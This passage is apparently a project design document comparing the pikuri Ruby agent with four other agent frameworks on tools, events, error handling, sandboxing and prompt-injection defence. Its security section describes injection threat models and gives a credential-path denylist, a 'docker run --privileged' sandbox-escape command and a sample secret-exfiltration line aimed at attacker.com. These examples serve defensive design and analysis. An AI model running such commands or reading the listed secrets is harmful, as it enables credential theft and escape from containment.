# COMPARISON.md

A side-by-side look at how four OSS agent-or-agent-adjacent projects solve
the same problems pikuri solves, and a ranked list of ideas worth porting.
*Pikuri-as-shipped state* — the pikuri rows describe the codebase as it is
post-MCP/skills/coding-tools migration; ruby_llm itself is now infrastructure
under us, not a peer to compare against.

## Projects in this comparison

| Project | Language | Scope | Loop size | Key abstraction |
| --- | --- | --- | --- | --- |
| **pikuri** (this repo) | Ruby on top of ruby_llm | small general-purpose CLI agent + in-repo coding agent + MCP-enabled assistant | listeners + controls on top of `RubyLLM::Chat#complete` (~885 lines of `Agent`) | `Tool` factory (synthetic `RubyLLM::Tool` subclass) + `Tool::Parameters` strict validator + sealed `Agent::Event` value hierarchy |
| **ruby_llm** ([crmne/ruby_llm](https://github.com/crmne/ruby_llm)) | Ruby | multi-provider SDK + Rails integration | ~37 lines across `Chat#complete` + `Chat#handle_tool_calls` | `RubyLLM::Tool` subclass + provider adapters |
| **langchainrb** ([patterns-ai-core/langchainrb](https://github.com/patterns-ai-core/langchainrb)) | Ruby | LLM-app framework: RAG/vector search + Assistant + multi-provider | ~421 lines (`assistant.rb`) state machine: `:ready` → `:in_progress` → `:requires_action` → `:completed` | `Langchain::Assistant` + class-level `ToolDefinition` DSL + per-provider `LLM::Adapter` |
| **pi** ([earendil-works/pi](https://github.com/earendil-works/pi)) | TypeScript | extensible coding-agent harness | ~700 lines (`agent-loop.ts`) | Typebox-typed tools + extensions/skills |
| **opencode** ([sst/opencode](https://github.com/sst/opencode)) | TypeScript | full terminal coding agent (Claude-Code-shaped) | effect-based, split across `processor.ts`/`session.ts` | Effect services + `.txt` prompt files |

The five are at very different scopes:

- **ruby_llm** is now pikuri's runtime, not a peer. It still appears in the
  comparison because some design choices (tool DSL, message shape, error-
  return convention) live in ruby_llm now and pikuri inherits them.
- **langchainrb** is the closest existing Ruby framework to pikuri's scope
  — same language, same general "assistant + tools" target — but with a
  RAG/vector-search-first orientation, no MCP, no sub-agents, no Skills,
  and a state-machine loop instead of a callback-driven one.
- **pi** is a coding-agent harness: same shape as a Claude-Code-style CLI but
  designed as a thin core with everything (sub-agents, plan mode, MCP, perms)
  pushed to extensions.
- **opencode** is much bigger than pikuri — closer to Claude Code itself. The
  value here is mining ideas, not comparing line counts.

Pikuri now spans two distinct application shapes — general-purpose chat
(`bin/pikuri-chat`), in-repo coding (`bin/pikuri-code`), and an
MCP-augmented assistant (`bin/pikuri-assistant`) — all wired on the same
`Agent` + `Tool` core (~9.1k lines of `lib/`). The job is the *extension
surface* on top of ruby_llm: strict validation, the sealed `Event`
hierarchy, listener-based rendering, controls for cancellation/step-
budget/mid-loop injection, sub-agents, skills, MCP, and a fixed
deliberate set of bundled tools.

---

## Agent loop

| | Loop shape | Streaming | Termination | Step budget |
| --- | --- | --- | --- | --- |
| pikuri | three callbacks (`after_message`, `before_tool_call`, `after_tool_result`) wired on a `RubyLLM::Chat`; controls (`StepLimit`, `Cancellable`, `Interloper`) poked at well-defined boundaries; `run_loop` is `chat.ask(message)` (`pikuri-core/lib/pikuri/agent.rb`) | opt-in via `Agent.new(streaming: true)` — per-chunk `Event::{Thinking,Assistant}Delta`; propagates to sub-agents + synthesizer | inherits ruby_llm's: no tool calls (or `Tool::Halt`); also `StepLimit::Exceeded` → `Synthesizer.run` rescue, or `Cancellable::Cancelled` re-raise | yes (`Control::StepLimit`, with step-exhaustion rescue via `Synthesizer`) |
| ruby_llm | recursive: `Chat#complete` calls itself after running tool calls (`lib/ruby_llm/chat.rb:156–293`) | yes, optional via block | LLM returns no tool calls, OR `Tool::Halt` short-circuits | no — bounded only by `Halt` |
| langchainrb | state machine over `messages.last.standard_role`: `process_latest_message` dispatches `:system / :llm / :user / :tool` to handlers; on tool-call response sets `:requires_action`; `execute_tools` sets `:in_progress`; loops until terminal state | per-LLM block at `Assistant.new(...) { \|chunk\| ... }`; provider-dependent | LLM returns no tool calls → `:completed`; or `auto_tool_execution: false` returns at `:requires_action` so host can inspect | no |
| pi | nested loops: outer for follow-up queue, inner for steering+tools (`packages/agent/src/agent-loop.ts:155–269`) | yes — `EventStream<AgentEvent>` | `shouldStopAfterTurn()` hook, `stopReason`, abort | implicit via context-window compaction |
| opencode | one-shot processor returning `"compact" \| "stop" \| "continue"` per turn (`src/session/processor.ts:115–425`) | yes — Vercel AI SDK chunk events | model emits no tool calls → `"stop"` | no — context overflow → `"compact"` |

**Takeaway.** Pikuri's loop is now the thinnest of the five with real
extension wiring: ruby_llm owns iteration, and pikuri's `Agent` is a
wiring file — three callbacks, three controls, one sealed `Event`
hierarchy, plus a step-exhaustion rescue (`Synthesizer.run`) and a
cancellation re-raise path. Streaming is opt-in (`streaming: true`)
and propagates to sub-agents and the synthesizer consistently. The
langchainrb state-machine approach is the obvious Ruby alternative
shape but pays for orthogonal "host decides when to run tools" cases
pikuri doesn't need.

---

## Provider / transport abstraction

- **pikuri**: delegates to ruby_llm. `bin/pikuri-chat`/`pikuri-code`/
  `pikuri-assistant` configure the OpenAI provider for the local
  llama.cpp server (`openai_api_base` + `assume_model_exists: true`);
  switching to Anthropic / Gemini / Bedrock / Ollama / etc. is a
  one-block edit in `RubyLLM.configure` — no pikuri-side code change.
  `Agent::ContextWindowDetector` resolves the model's context-window
  cap at construction time from override → ruby_llm registry →
  llama.cpp `/props` probe, so listeners (`TokenLog`) can render
  `ctx=<used>/<cap>` against the right ceiling.
- **ruby_llm**: provider-per-class (`lib/ruby_llm/providers/{openai,anthropic,gemini,bedrock,ollama,...}/`).
  Tool schema stays canonical; per-provider adapters wrap it.
- **langchainrb**: own multi-provider layer (`lib/langchain/llm/{openai,
  anthropic,google_gemini,aws_bedrock,ollama,cohere,mistralai,...}.rb`),
  unified by `LLM::Base` + `LLM::Adapter` for Assistant integration. Each
  provider supplies its own message class
  (`Assistant::Messages::{OpenaiMessage,AnthropicMessage,...}`) and
  schema converter (`to_openai_format` / `to_anthropic_format` /
  `to_google_gemini_format`). Vision (image_url) is first-class on the
  message type.
- **pi**: own multi-provider layer in `@earendil-works/pi-ai` covering OpenAI,
  Anthropic, Google, Bedrock, etc.
- **opencode**: built on Vercel AI SDK. Adding a provider is one entry in
  `BUNDLED_PROVIDERS` (`src/provider/provider.ts:93–118`).

**Takeaway.** Pikuri inherits ruby_llm's "canonical schema + thin
per-provider adapter" shape — chosen over opencode's SDK-of-SDKs and
langchainrb's everything-in-house approach because we already wrote
tools against the OpenAI tool-call shape and ruby_llm preserves that
as the canonical form. The bundled `bin/pikuri-*` scripts are hard-
coded for the local llama.cpp setup; multi-provider wiring would be a
small `bin/`-level change rather than a library-level rewrite.

---

## Tool abstraction

| | Definition style | Schema | Validation strictness |
| --- | --- | --- | --- |
| pikuri | `Tool.new(...)` factory returns a synthetic `RubyLLM::Tool` subclass; `Tool::Parameters` builder lives on top of ruby_llm's tool layer | fluent `Tool::Parameters` builder → JSON Schema, fed to ruby_llm's `params(hash)` | strict: unknown keys rejected with DidYouMean, type coercion, all errors collected. The keyrest signature on `execute(**args)` makes ruby_llm's keyword-presence checker no-op so pikuri's validator runs first |
| ruby_llm | subclass `RubyLLM::Tool`, class-level DSL | three options: `params { ... }` block, `param :name` declarative, OR auto-inferred from `execute` keyword args | strict but **no DidYouMean** |
| langchainrb | class `extend Langchain::ToolDefinition`; `define_function :method_name, description: do property :foo, type:, required:; end`; tool can expose multiple functions, each becomes a separate tool entry named `<class>__<method>` | DSL → JSON Schema with per-provider exporters; supports `object`/`array`/`enum` recursively | required-key checked by JSON Schema export only — no DidYouMean, no coercion |
| pi | `AgentTool<TParameters>` interface, factory functions | Typebox `Type.Object()` (compile-time + runtime) | Typebox-strict; optional `prepareArguments()` shim for LLM quirks |
| opencode | Effect Schema decoders (Zod-shaped) + `.txt` description files | Effect `Schema.decodeUnknownEffect()` | strict; failure produces "rewrite the input so it satisfies..." message |

**Takeaway.** Pikuri's strict-with-DidYouMean validator is still the single
most load-bearing piece of code distinguishing it from ruby_llm and
langchainrb. Both Ruby alternatives produce thin "missing keyword: x"
messages on bad input; pikuri layers DidYouMean / coercion / all-errors-
collected on top. Langchainrb's one-class-many-functions shape
(`extend ToolDefinition` then multiple `define_function`s) is a different
ergonomic — pikuri's "one constant or instance per tool" is closer to
opencode's pattern. Method-signature introspection (ruby_llm's
auto-infer-from-`execute`) remains an option for trivial tools, but the
explicit `Parameters` builder keeps per-argument descriptions next to
the schema, which is hard to give up entirely.

MCP tools are the documented exception to pikuri's strict-validation
contract — they're synthesised as raw `RubyLLM::Tool` subclasses inside
`Mcp::Servers` from each server's `input_schema`, fed in via
`Agent::ExtensionContext#add_raw_tool`. The strict-validation guarantee covers
native tools only; MCP-side validation catches bad input on the server
end. See `pikuri-mcp/lib/pikuri/mcp/servers.rb` for the rationale.

---

## Available tools

| | calc | shell/bash | read | write | edit | grep | glob | search | scrape/fetch | sub-agent | skill | mcp | todo/plan | LSP | vector/RAG |
| --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- |
| pikuri | ✅ | ✅ bash | ✅ read | ✅ write | ✅ edit | ✅ grep | ✅ glob + file_list | ✅ web_search | ✅ web_scrape + fetch | ✅ | ✅ Agent Skills standard | ✅ stdio + HTTP | — | — | — |
| ruby_llm | — (SDK only — no bundled tools) | | | | | | | | | | | | | | |
| langchainrb | ✅ | — | ✅ file_system | ✅ file_system | — | — | — | ✅ google_search / tavily | — | — | — | — | — | — | ✅ vectorsearch (Chroma, Pinecone, Pgvector, Weaviate, Qdrant, Milvus, Elasticsearch, Hnswlib) + DB, NewsRetriever, Weather, Wikipedia, RubyCodeInterpreter |
| pi | — | ✅ bash | ✅ read | ✅ write | ✅ edit | ✅ grep | ✅ find | — | — | — (extension) | ✅ via extensions | — | — (extension) | — | — |
| opencode | — | ✅ shell | ✅ read | ✅ write | ✅ edit + patch | ✅ grep | ✅ glob | ✅ search (Exa) | ✅ fetch | ✅ task | ✅ | — | ✅ todo + plan | ✅ | — |

ruby_llm ships **no tools at all** — it's an SDK; the developer subclasses
`RubyLLM::Tool` and wires their own. langchainrb's "tools" are a different
shape — most are *capability wrappers* (Wikipedia, Weather, NewsRetriever,
SQL Database, Vectorsearch) rather than the file/shell building blocks
pikuri ships. pi ships only file/shell ops; web search, sub-agents, etc.
are pushed to extensions. opencode is the most batteries-included on the
coding-agent axis.

The pikuri row reflects the union of three bundled binaries:
`bin/pikuri-chat` wires calc + web_search + web_scrape + fetch +
sub_agent; `bin/pikuri-code` wires the file/shell stack (read, write,
edit, grep, glob, bash) plus the same web/calc/sub_agent set as
auxiliaries; `bin/pikuri-assistant` adds the MCP connector on top of
the chat tool set. Three binaries on a shared `Agent` + `Tool` core.

**Takeaway.** Pikuri now covers the *general-purpose*, *coding-agent*,
and *MCP-augmented assistant* tool surfaces from one codebase, with
Skills bridging static text knowledge between them. The remaining gaps
versus opencode are todo/plan tools and LSP — both deliberately
deferred (see `ideas/coding-agent.md`). The gap versus
langchainrb is vector search / RAG — out of scope by design; pikuri is
an agent, not a RAG framework.

---

## Tool description quality

This is the section most worth reading. The LLM only gets to see the
`description` and per-parameter strings; their quality directly affects how
often the model picks the right tool with the right arguments.

### pikuri (verbatim — post-cleanup)

All bundled tools follow a single heredoc shape: one-line summary,
blank line, `Usage:` bullet list. Showing `web_scrape` as the exemplar
— this tool had the biggest jump from the pre-convention state:

```
Scrapes the rendered webpage or text file at the given URL and returns its main content as Markdown.

Usage:
- Use for HTML pages where you want readable content — readability extraction strips nav, sidebars, and boilerplate.
- For raw textual payloads (JSON, CSV, robots.txt, source files), use fetch instead — it returns bytes verbatim, while web_scrape would corrupt them with a Markdown pass.
```

Two cross-cutting decisions fell out of the pass:

- **Universal `Error: ...` recovery lives in the per-binary system
  prompts** (`prompts/pikuri-chat.txt`, `prompts/pikuri-assistant.txt`,
  `prompts/coding-system-prompt.txt`) as one rule, not per-tool. The
  same guidance (use what you have, or tell the user; do not retry the
  same call) covers search rate-limits, scrape 404s, fetch refusals,
  calculator parse errors, MCP exceptions, and tool argument validation
  failures — writing it once avoids per-tool drift.
- **Per-argument constraints stay in the parameter description**, never
  duplicated in the tool description. String parameters use inline
  `e.g. "..."` examples in the ruby_llm pattern; integer parameters
  (`max_results`, `max_chars`) state default and cap as the anchoring
  equivalent.

The convention is documented in `CLAUDE.md` under "Conventions" so new
tools land at the same bar without per-PR re-litigation.

### ruby_llm (from spec fixture — there are no shipped tools)

```ruby
class Weather < RubyLLM::Tool
  description 'Gets current weather for a location'
  param :latitude, desc: 'Latitude (e.g., 52.5200)'
  param :longitude, desc: 'Longitude (e.g., 13.4050)'
end
```

The standout is **example values inside parameter descriptions**
(`'Latitude (e.g., 52.5200)'`). Pikuri now applies this convention
universally — every string parameter carries an inline `e.g. "..."` and
every integer parameter states default + cap.

### langchainrb (verbatim — `Calculator.execute`)

```ruby
define_function :execute, description: "Evaluates a pure math expression" do
  property :input, type: "string", description: "Math expression", required: true
end
```

Per-function description, single-line. No usage bullets, no examples in
parameter descriptions, no failure-mode guidance. The terse style is
fine when the LLM has been trained against named tools (the function
name `langchain_tool_calculator__execute` carries most of the signal),
but loses the chain-with-other-tools framing pikuri and opencode put
front and center.

### pi (verbatim — `read` tool)

```
Read the contents of a file. Supports text files and images (jpg, png,
gif, webp). Images are sent as attachments. For text files, output is
truncated to 10000 lines or 2048KB (whichever is hit first). Use
offset/limit for large files. When you need the full file, continue with
offset until complete.
```

Crisp, behavioural, concrete numbers, clear failure mode.

### opencode (verbatim — `read.txt`)

```
Read a file or directory from the local filesystem. If the path does not
exist, an error is returned.

Usage:
- The filePath parameter should be an absolute path.
- By default, this tool returns up to 2000 lines from the start of the file.
- The offset parameter is the line number to start from (1-indexed).
- To read later sections, call this tool again with a larger offset.
- Use the grep tool to find specific content in large files or files with
  long lines.
- If you are unsure of the correct file path, use the glob tool to look up
  filenames by glob pattern.
- Contents are returned with each line prefixed by its line number as
  `<line>: <content>`. ...
- Any line longer than 2000 characters is truncated.
- Call this tool in parallel when you know there are multiple files you
  want to read.
- Avoid tiny repeated slices (30 line chunks). If you need more context,
  read a larger window.
- This tool can read image files and PDFs and return them as file
  attachments.
```

opencode's `edit` description is similar in shape — a one-line summary, then
a `Usage:` bullet list with explicit dos/don'ts ("ALWAYS prefer editing
existing files", "NEVER write new files unless explicitly required",
"This tool will FAIL if `oldString` is found multiple times in the file with
an error...").

**Takeaway.** opencode's pattern — _summary, then bullet list of usage
constraints_ — is the gold standard, and pikuri now applies it uniformly
across all bundled tools. The one place pikuri diverges: opencode bakes
failure-mode hints inline ("If the path does not exist, an error is
returned"), pikuri factors them into a single universal rule in each
binary's system prompt. Cheaper to maintain, loses some tool-specific
specificity. Langchainrb's terse style is the floor; ruby_llm's
`e.g.`-in-parameters is a free uplift pikuri now applies universally.

---

## Conversation / message types and event streams

| | Message store | Event stream | Streaming deltas | Token bookkeeping |
| --- | --- | --- | --- | --- |
| pikuri | inherits ruby_llm's `Chat#messages` | sealed `Agent::Event` hierarchy: `UserTurn(mid_loop)`, `Thinking`, `Assistant`, `ThinkingDelta`, `AssistantDelta`, `ToolCall`, `ToolResult`, `Tokens`, `ContextCap`, `FallbackNotice`, `Cancelled` — all flow through one `Listener::Base#on_event` entry point | opt-in via `Agent.new(streaming: true)`; per-chunk `*Delta` events alongside message-level bookends | `Tokens` event carries `input`/`output`/`cached`/`cache_creation`/`thinking`/`model_id`; `Listener::TokenLog` tracks running context-window size; `Event::ContextCap` carries the detected cap from `ContextWindowDetector` |
| ruby_llm | plain Array of `Message` objects (no log wrapper) | three registered callbacks (`after_message`, `before_tool_call`, `after_tool_result`); pikuri-style structured events not exposed | yes, optional via block | per-message `tokens` field on `Message`; no running aggregate |
| langchainrb | `messages` (Array of provider-specific `Messages::*Message`); `add_message_callback` proc fires on every append | none beyond the two callbacks (`add_message_callback`, `tool_execution_callback`) | per-LLM block at `Assistant.new(...) { ... }` | running totals on `Assistant`: `total_prompt_tokens` / `total_completion_tokens` / `total_tokens` |
| pi | TypeScript discriminated union; custom message types extensible via declaration merging | `EventStream<AgentEvent>` | yes | per-event |
| opencode | `MessageV2` with `ErrorPart` / `ToolPart` / `TextPart` etc.; parts are typed and persisted in SQLite per session | Vercel AI SDK chunks; bus emits typed events for permission flows | yes | per-message |

**Takeaway.** Pikuri now has the richest structured-event surface among
Ruby implementations: a sealed `Data.define` value hierarchy covering
turns, thinking, assistant text, both streaming-delta modes, tool calls,
tool results, token usage, context-window cap, fallback notices, and
cancellation — all flowing through one `on_event` entry point that
listeners override. Langchainrb's two-callback model
(`add_message_callback` + `tool_execution_callback`) is the same
*architectural shape* pikuri started with, but the sealed event
hierarchy is the upgrade pi/opencode have and Ruby otherwise lacks.

The four bundled listeners (`Terminal`, `InMemoryEventList`, `TokenLog`,
`RateLimited`) demonstrate the surface: TUI rendering, test capture,
running token accounting, and pacing for shared cloud quotas. None are
"the" listener — they're examples of the shape new sinks (a web UI,
a JSON log) would take.

---

## Error handling

| | Tool argv malformed | Tool execute failure (recoverable) | Tool execute failure (bug) |
| --- | --- | --- | --- |
| pikuri | `"Error: <msg>"` string fed back to model (with full schema reprinted by `Tool::Parameters`) — pikuri's validator runs *before* ruby_llm's would | `"Error: <msg>"` string by tool convention; ruby_llm passes it through verbatim to the next observation | raises through ruby_llm; kills the loop |
| ruby_llm | `{ error: "..." }` hash sent to model | tool returns whatever; exceptions **bubble up** to host (not caught) | bubbles up to host |
| langchainrb | tools are expected to handle and return `tool_response(content: "...")` — failures surface as observation text; required-key validation happens at JSON Schema export, not at run time | tool returns whatever; `execute_tools` catches any exception, logs it, and transitions to `:failed` state — loop ends, host inspects | same as recoverable — caught at the `execute_tools` boundary |
| pi | caught and wrapped as `ToolResultMessage` with `isError: true` | caught and wrapped as text `"Error: <msg>"` | caught and wrapped (same path) |
| opencode | tool catches Effect Schema decode failure and returns "rewrite the input..." text | text observation | caught and converted to `MessageV2.ErrorPart`; loop continues |

Pikuri's split — _recoverable failures become observations, bugs raise_ — is
explicit and documented in `pikuri-core/lib/pikuri/tool.rb`. ruby_llm shares the
philosophy; pikuri's String convention is what flows through to the model
(ruby_llm's `Chat#handle_tool_calls` calls `.to_s` on whatever the tool
returns and writes it as the tool message's content). Langchainrb is closer
to pi/opencode: trap everything at the `execute_tools` boundary, transition
to `:failed`, surface to the host. The trade-off is well-documented in
pikuri's CLAUDE.md (`Errors are loud`) — bugs should be loud during
development; the carve-out for loop-secondary best-effort paths (e.g.
the context-window probe hitting a wedged server) keeps the agent alive
when the failure is cosmetic.

**Takeaway.** Pikuri's choice survives unchanged. The opencode/pi/langchainrb
"trap-everything" posture is what you want when the agent is long-running
and unattended; the "raise on bugs" posture is what you want during
development. Pikuri's choice is the latter — fine for its scope.

---

## Permission / sandboxing

- **pikuri**: three-seam approach for v1.
  - **`Workspace::Filesystem`** is a single concrete class with
    explicit `project_root:` / `readable:` / `writable:` / `temp:`
    parameters. `project_root` is the writable containment ceiling
    AND the relative-path base AND the chdir target for Bash /
    Grep / Glob — one anchor, no separate cwd (hosts that want the
    agent scoped to a subtree pass that subtree as `project_root`).
    Every coding tool (`Read`/`Write`/`Edit`/`Grep`/`Glob`/`Bash`)
    takes a workspace via constructor and routes paths through
    `#resolve_for_read(path)` / `#resolve_for_write(path)`,
    rejecting `..`-escapes and symlinks that resolve outside any
    declared root. `Filesystem::AllowAll` is the unrestricted
    variant for `--yolo` / in-container use: same accessor surface,
    but `resolve_for_*` accept any path *except* those on a
    hardcoded credential denylist (`~/.ssh`, `~/.aws`, `~/.gnupg`,
    `~/.kube`, `~/.docker`, `~/.netrc`, `/etc/shadow`, …).
  - **`Workspace::Confirmer`** abstract base + `TERMINAL` /
    `AUTO_APPROVE` bundled implementations: `Write`/`Bash` route
    every prompt through `#confirm?(request:)` — a semantic
    question + optional detail, with all presentation (color,
    escaping, the y/n cue) owned by the confirmer — rather than
    touching `$stdin`/`$stdout` — `--yolo` swaps in
    `AUTO_APPROVE`. The seam exists so a future TUI / IDE host
    plugs in by writing a new `Confirmer` subclass, not by
    editing tool internals.
  - **`Code::Bash::Sandbox`** is a third seam, distinct from
    Workspace: Workspace governs what the LLM observes via the
    file tools; Sandbox governs the filesystem view of the bash
    subprocess. `Sandbox::NONE` is the identity wrap (default for
    `Bash.new`, what `--no-sandbox` / `--yolo` swap in);
    `Sandbox::Bubblewrap` composes a `bwrap` argv from
    `workspace.readable` / `writable` plus a curated `/etc`
    baseline (`ETC_BASELINE` — TLS certs, DNS, timezone, hosts)
    and per-toolchain ephemeral overlays for `~/.gradle/caches`,
    `~/.m2/repository`, `~/.cargo/registry`, etc. Overlays are
    *content-only subdirs* (not the toolchain's whole `$HOME`),
    so credentials in `~/.gradle/gradle.properties`,
    `~/.gradle/init.d`, `~/.m2/settings.xml`,
    `~/.cargo/credentials.toml` never appear in the sandbox at
    all; writes vanish at process exit. Threat model: blast-radius
    containment + prevention of cross-project contamination via
    shared toolchain caches — *not* malware-resistance (network
    egress stays open by design so `git pull` / `curl` work; prompt
    injection can still modify project sources). Construction
    refuses if any workspace root contains a container / VM
    control socket (`/var/run/docker.sock`, `containerd.sock`,
    `podman.sock`, `libvirt-sock`, …) — exposing one effectively
    undoes the sandbox via `docker run --privileged -v / /host`.
  Opencode-style glob rules (`allow` / `deny` / `ask`) are
  deferred — see `ideas/coding-agent.md`. The next step
  per that note: ClaudeCode-style agentic review of bash commands
  for auto-approval / -denial of the obviously-safe cases,
  layered *on top of* (not replacing) bubblewrap.
- **`Pikuri::Subprocess.spawn` chokepoint**: every subprocess spawn
  in any pikuri-* `lib/` goes through one entry point that creates
  a new process group per invocation, tracks pgids, and SIGTERMs
  everything tracked via `at_exit` so backgrounded shell children
  can't outlive pikuri. Grep-enforceable:
  `grep -rn 'Process\.spawn\|Open3\|system' pikuri-*/lib/` should
  only hit `pikuri-core/lib/pikuri/subprocess.rb` (one carve-out,
  in `pikuri-mcp/lib/pikuri/mcp/client_wrapper.rb` — the `mcp` gem
  owns its own subprocess lifecycle for stdio MCP entries).
- **ruby_llm**: nothing — out of scope for an SDK.
- **langchainrb**: nothing — `Tool::FileSystem` reads and writes anywhere
  the host process can. `Tool::RubyCodeInterpreter` uses `safe_ruby` (a
  whitelist-based sandbox the README notes is "in need of a better
  solution").
- **pi**: `beforeToolCall` extension hook can `{ block: true, reason: "..." }`.
  No built-in UI prompt. Safety is delegated to the host or to extensions.
- **opencode**: declarative rules, glob-aware (`src/permission/index.ts`):

  ```ts
  {
    "*": "allow",
    question: "deny",
    plan_enter: "deny",
    repo_clone: "deny",
    read: { "*": "allow", "*.env": "ask", "*.env.example": "allow" },
    external_directory: { "*": "ask", ...whitelistedDirs: "allow" },
  }
  ```

  Three actions: `allow` / `deny` / `ask`. On `ask`, execution is paused via
  a `Deferred`, the bus emits a request, the UI replies "once" / "always" /
  "reject". Denial returns a typed error to the model.

**Takeaway.** Pikuri's three-seam approach — `Workspace` locks the
file tools' read/write paths to the discovered project root;
`Confirmer` gates user-state mutations (`Write`, `Bash`);
`Sandbox::Bubblewrap` constrains the bash subprocess's filesystem
view to the same project + a curated runtime baseline + ephemeral
toolchain overlays — is the v1 answer for an interactively
supervised agent. Opencode's three-action glob model is the
obvious next step on the *permission* axis once friction shows up
in practice; the seams are already in place to swap
implementations without touching tool internals. Bubblewrap is
*not* malware-resistant — network egress stays open by design and
in-project mutation is on the table — so adversarial isolation
still needs a container or VM around pikuri, with bubblewrap as
the inner layer. Langchainrb is the cautionary tale here —
`FileSystem.read_file` / `write_to_file` take arbitrary paths
from the LLM with no validation.

### Pikuri vs. Claude Code: structural vs. operational defense

Claude Code isn't in the project table (it's closed-source), but it's
the reference coding agent the others are shaped after, and its security
model is the instructive contrast. Inspect the toolset on its *main*
agent — `Read` / `Write` / `Edit`, `Bash`, `WebFetch` / `WebSearch`,
MCP — and it holds all three legs of the lethal trifecta at once
(private data + untrusted content + egress). It does **not** attempt
pikuri's trifecta-break. That's not an oversight; it's the opposite bet.

- **Pikuri defends structurally.** Remove a leg *per agent*: sub-agent
  capability boundaries (`RESEARCHER` has no `read`, `FILE_MINER` has no
  egress), so the agent that touches untrusted content literally can't
  act on an injection. The defense is a property of the capability
  graph, so it holds even against a fully injected model.
- **Claude Code defends operationally.** Keep all three legs; insert a
  trusted human + an OS sandbox + an injection-hardened model at the
  moment of the dangerous action. Its top three, in order:
  (1) human-in-the-loop permission gating (`allow` / `deny` / `ask`
  rules, permission modes); (2) OS sandbox (`sandbox-exec` / bubblewrap)
  + working-directory confinement + a trust-this-folder gate;
  (3) model-level injection resistance plus platform-side monitoring.

**The asymmetry worth recording.** Claude Code's first two defenses
were never *primarily* injection defenses — the human gate is a
*mistake* control (it catches the hallucinated `rm -rf` whether or not
an attacker is involved); the sandbox is a *code-execution* control
(it bounds blast radius regardless of cause). They blunt injection as a
side effect, so they survive the threat model shifting. Pikuri's
trifecta-break is *specifically* an anti-injection bet — which makes it
the one defense that goes obsolete if a data-vs-instruction separation
("an NX flag for tokens") is ever solved, because the lethal trifecta
is lethal *only* because injection exists: solve injection and the
trifecta stops being a category. The flip side, in pikuri's favor: a
model's own injection resistance (Claude Code's #3) is the one leg that
lives *inside* the component an injection compromises, so it can't be
leaned on alone — and neither project does (pikuri via capability
boundaries, Claude Code via the human + sandbox beneath it).

**Where they converge.** Pikuri can't break the trifecta for its own
coding agent either: `bin/pikuri-code` / `bin/pikuri-assistant` hold
`read` + `bash` + `fetch` on the parent and fall back to system-prompt
nudging plus the `Confirmer` (SECURITY.md "Non-goals", last bullet). So
coding is the harness where pikuri's structural model runs out and the
operational one takes over — exactly Claude Code's territory. And
Claude Code's visible investment in reducing confirmation fatigue
(smarter triage so the human is interrupted less, and better when they
are) is the same conclusion driving pikuri's confirmer-as-last-line-of-defense
framing (book [the security chapter](book/security.md) §"The human gate, and why
fatigue is the enemy"; the not-yet-shipped seam residue in
`ideas/more-confirmers.md`): for an *attended*
coding agent the human gate is the load-bearing control, and its whole
value rides on not inducing fatigue. The shared nuance is deployment
shape — the human gate is worth zero *unattended* (cron / CI / a
`minions` fan-out), where only structural defense or an egress
allowlist survives.

### Prior art deep-dive: PI's two isolation weights, opencode's permission system

The bullets above sketch what PI and opencode *ship*; this is the
deeper survey of *how*, done while scoping pikuri's own security
posture. Findings reinforce pikuri's framing more than they contradict
it.

**Common ground.**
- **Neither has prompt-injection defenses.** No provenance markers on
  tool output, no "treat results as data" language in system prompts,
  no separate channels. Confirms the load-bearing tag — nobody in this
  space has solved it.
- **Both cap tool output** at ~2000 lines / 50KB with overflow
  spilled to a tempfile and the path returned to the LLM. Cheap to add
  to pikuri.
- **Both validate sub-agent privilege separation as the right shape** —
  PI via a `--tools` allowlist on the spawned child
  (`packages/coding-agent/examples/extensions/subagent/index.ts:267`),
  opencode via inherited parent-denies plus per-preset deny baselines
  (`packages/opencode/src/agent/subagent-permissions.ts`,
  `agent/agent.ts:178-220`).

**PI ships nothing security-related in core**, but offers isolation
through two opt-in extensions of very different weights. No
permission system in core (only a 30-line example extension
regex-matching `rm -rf` / `sudo` / `chmod 777`), no workspace
constraint (paths resolve absolutely with `~` expansion, no `..`
rejection — `core/tools/path-utils.ts:54-93`), bash unrestricted, no
MCP, no provider warnings, no Dockerfile. The README's stance is one
line: "Run in a container yourself."

The **lighter isolation extension** is `sandbox`: wraps the `bash`
tool only — **bubblewrap on Linux / `sandbox-exec` on macOS** —
driven by `~/.pi/agent/extensions/sandbox.json`. Default policy:
network *on* with an npm / pypi / github allowlist; deny-read for
`~/.ssh` / `~/.aws` / `~/.gnupg`; deny-write for `.env*` / `*.pem` /
`*.key`. Only `bash` is wrapped — `edit` / `write` / `read` execute
outside the sandbox, so a prompt-injection that prefers `edit` over
`bash sed` walks past it. Sub-agents spawn as separate `pi` child
processes that don't inherit the `-e ./sandbox` flag — no recursion.
(`packages/coding-agent/examples/extensions/sandbox/index.ts`.)

The **heavier isolation story is Gondolin**
(<github.com/earendil-works/gondolin>, separate Apache-2.0 project
from the same org) and the more interesting one as prior art.
**Lightweight Linux micro-VMs** (QEMU by default, experimental
`krun` backend) — explicitly stronger isolation than containers /
namespaces. The PI-side extension *"runs pi tools inside a micro-VM
and mounts your project at `/workspace`"*; the whole toolset runs
inside, not just bash. Three design choices worth recording:

- **Programmable HTTP/TLS egress proxy with allowlists.** Not just
  iptables — a real proxy that inspects what's leaving.
- **JS-configurable VFS mounts.** Host decides what filesystem the
  guest sees.
- **Secret-placeholder pattern.** Guest env vars hold placeholders,
  not real values; the egress proxy substitutes the real secret
  **only on outbound requests to allowlisted hosts**. A
  prompt-injection that does `echo $STRIPE_KEY > attacker.com` fails
  twice: env doesn't contain the real key, and `attacker.com` isn't
  allowlisted. Genuinely novel prior art — Anthropic's MCP / OAuth
  flows don't have an equivalent.

Gondolin is also the substrate for **`pi-chat`** (Discord / Telegram
→ Claude bridge, same org) — one micro-VM per channel for
multi-tenant isolation. Worth noting: pi-chat's docs explicitly say
*"All outbound HTTP/TLS open by default"* — the egress policy is
available but not aggressively configured in that product.

**opencode is the opposite.** A sophisticated three-action
`allow` / `deny` / `ask` permission system keyed on
`(permission-name, glob-pattern)`, last-match-wins, default-`ask`,
persisted to per-project SQLite for `always` approvals
(`packages/opencode/src/permission/evaluate.ts:11`,
`permission/index.ts:140-145`), with a **tree-sitter bash parser**
deriving sticky-approval prefix patterns like `git status *`
(`tool/shell.ts:261-265, 308-333`). But `SECURITY.md` is explicit at
the top: *"OpenCode does not sandbox the agent. The permission system
exists as a UX feature... it is not designed to provide security
isolation."* Workspace is soft — out-of-tree triggers an
`external_directory` prompt, not a denial; no realpath / symlink
